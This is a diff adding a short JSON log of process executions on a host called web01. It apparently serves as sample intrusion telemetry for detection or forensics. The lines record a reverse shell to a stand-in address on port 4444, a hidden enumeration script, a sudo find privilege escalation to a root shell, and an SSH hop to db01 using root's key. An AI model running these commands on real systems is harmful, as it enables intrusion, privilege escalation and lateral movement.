@@ -1,0 +1,5 @@
+{"row": 1, "time_utc": "2026-06-15T22:07:41Z", "host": "web01", "event": "exec", "pid": 2210, "ppid": 1180, "comm": "sh", "user": "www-data", "cmdline": "sh -c id"}
+{"row": 2, "time_utc": "2026-06-15T22:08:56Z", "host": "web01", "event": "exec", "pid": 2240, "ppid": 1180, "comm": "bash", "user": "www-data", "cmdline": "bash -i >& /dev/tcp/203.0.113.150/4444 0>&1"}
+{"row": 3, "time_utc": "2026-06-15T22:12:30Z", "host": "web01", "event": "exec", "pid": 2301, "ppid": 2240, "comm": "bash", "user": "www-data", "cmdline": "bash /tmp/.x/lin_enum.sh"}
+{"row": 4, "time_utc": "2026-06-15T22:16:05Z", "host": "web01", "event": "exec", "pid": 2360, "ppid": 2240, "comm": "sudo", "user": "www-data", "cmdline": "sudo -u root /usr/bin/find / -perm -4000 -exec /bin/sh ';'"}
+{"row": 5, "time_utc": "2026-06-15T22:20:44Z", "host": "web01", "event": "exec", "pid": 2401, "ppid": 2360, "comm": "ssh", "user": "root", "cmdline": "ssh -i /root/.ssh/id_ed25519 deploy@db01"}
